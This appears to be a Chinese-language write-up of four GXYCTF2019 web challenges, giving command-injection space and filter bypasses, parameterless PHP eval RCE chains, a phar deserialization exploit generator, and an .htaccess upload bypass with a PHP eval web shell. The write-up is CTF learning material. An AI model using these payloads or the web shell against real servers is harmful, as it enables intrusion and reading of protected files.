## 0x01 [GXYCTF2019]Ping Ping Ping

**命令执行变量拼接**

```
/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```

**过滤bash用sh执行**

```
echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

**内联执行**

将反引号内命令的输出作为输入执行

```
?ip=127.0.0.1;cat$IFS$9`ls`
```

绕过空格的方法大概有以下几种：

```
$IFS
${IFS}
$IFS$1 //$1改成$加其他数字貌似都行
< 
<> 
{cat,flag.php}  //用逗号实现了空格功能
%20 
%09 
```

> ps:有时会禁用cat:
> 解决方法是使用tac反向输出命令：
> linux命令中可以加\，所以甚至可以ca\t /fl\ag

1. 我们看到源码中有一个$a变量可以覆盖

   ```
   /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
   ```

2. 过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行。

   ```
   echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
   ```

3. 内联执行的做法(内联，就是将反引号内命令的输出作为输入执行)：

   ```
   ?ip=127.0.0.1;cat$IFS$9`ls` 
   ```

   输出目录所有文件
## 0x02 [GXYCTF2019]禁止套娃

试了几个目录发现不会404，就没想着去扫目录了，结果漏了/.git....能拿到index.php

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

给了参数exp,三次过滤第一次过滤了各种协议，第二个把括号呢参数给过滤了

第三个过滤了一些把字符串改成数字的函数操作

这里考虑无参数RCE

0. 测试输出

   ```
   print_r()
   vardump()
   ```

1. 扫描当前目录

   ```
   current(localeconv()) => .
   pos(localeconv()) => .
   
   payload=print_r(scandir(pos(localeconv())));
   ```

   或者也可以

   ```
   phpversion()   回显 string(11) "7.3.10-1+b1"
   floor(phpversion())   回显 float(7) 
   sqrt(floor(phpversion()))  回显 float(2.6457513110646) 
   tan(floor(sqrt(floor(phpversion())))) 回显 float(-2.1850398632615) 
   cosh(tan(floor(sqrt(floor(phpversion()))))) 返回4.5017381103491
   sinh(cosh(tan(floor(sqrt(floor(phpversion())))))) 返回45.081318677156
   ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))
   回显 46
   chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))
   回显 string(1) "." 
   next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))
   回显 string(2) ".." 
   ```

2. 可以看到 `flag.php` 是倒数第二个值，假设是倒数第一个我们可以用end()，但是并没有一个操作数组的函数能够输出数组的倒数第二个值。这里用嵌套函数实现

   ```
   array_reverse()+next()
   next(array_reverse(scandir(pos(localeconv()))))
   
   array_rand()+array_flip()
   随机读+键和值互换
   var_dump(array_rand(array_flip(scandir(current(localeconv())))));
   ```

3. 读文件

   因为et被ban了，所以不能使用``file_get_contents()``，但是可以可以使用``readfile()``或``highlight_file()``以及其别名函数``show_source()``

第二种方法是利用PHPSESSION

```
PHPSESSION=flag.php
session_id(session_start()) => flag.php
```

通过飘零师傅的文章可以知道，题目虽然ban了 `hex` 关键字，导致 `hex2bin()` 被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为 `flag.php` 这些字符是 `PHPSESSID` 本身就支持的。

使用 `session`之前需要通过 `session_start()` 告诉PHP使用session，php默认是不主动使用session的。

`session_id()` 可以获取到当前的session id。

因此我们手动设置名为 `PHPSESSID` 的cookie，并设置值为 `flag.php`

## 0x03 [GXYCTF2019]BabysqliV3.0

登陆界面弱密码爆破

admin password

进入后台可以上传文件

根据url试了一下有没有LFI

```
http://bb0e8107-18e7-4a15-9b48-c7c4c72cfa73.node3.buuoj.cn/home.php?file=php://filter/convert.base64-encode/resource=upload
```

可以拿到Upload.php和home.php的源码

找危险函数

```php
class Uploader{
    public $Filename;
	public $cmd;
	public $token;
	...
    function __destruct(){
		if($this->token != $_SESSION['user']){
			$this->cmd = "die('check token falied!');";
		}
		eval($this->cmd);
	}
    ...
}

if(isset($_FILES['file'])) {
	$uploader = new Uploader();
	$uploader->upload($_FILES["file"]);
	if(@file_get_contents($uploader)){
		echo "下面是你上传的文件：<br>".$uploader."<br>";
		echo file_get_contents($uploader);
	}
}
```

本来想直接上传flag.php利用``file_get_contents($uploader);``攻击的，但是这里好像读不出来，可能是因为路径问题。。

这里考察的是phar反序列化攻击

构造的对象

```php
<?php
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
}

$o = new Uploader();
$o->Filename="test";
$o->cmd="highlight_file('/var/www/html/flag.php');";
$o->token="GXY8576f1181ce29baf95cd9285c214d84d";//上传一个文件来获得
```

生成phar

```php
<?php
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
}

$o = new Uploader();
$o->Filename="test";
$o->cmd="highlight_file('/var/www/html/flag.php');";
$o->token="GXY8576f1181ce29baf95cd9285c214d84d";

$phar = new Phar("exp.phar");
$phar->startBuffering();
$phar->setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString('test.txt','test');  //添加要压缩的文件
$phar->setMetadata($o);  //将自定义 meta-data 存入 manifest
$phar->stopBuffering();
?>
```

```php
		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
		}
```

上传后利用name传参,phar://协议读取

然后再随便上传一个文件就可以看到了

## 0x04 [GXYCTF2019]BabyUpload

上传题，

试了半天只能传Content-Type: image/jpeg....

ph后缀被过滤，目录下没有现成的index.php

考虑上传**.htaccess**

```
AddType application/x-httpd-php .jpg
```

再传个马上去即可

```php
<script language="php"> 
@eval($_REQUSET['eki']);
</script>
```

### 参考资料

有趣的.htaccess :
[https://skysec.top/2017/09/06/%E6%9C%89%E8%B6%A3%E7%9A%84-htaccess/](https://skysec.top/2017/09/06/%E6%9C%89%E8%B6%A3%E7%9A%84-htaccess/)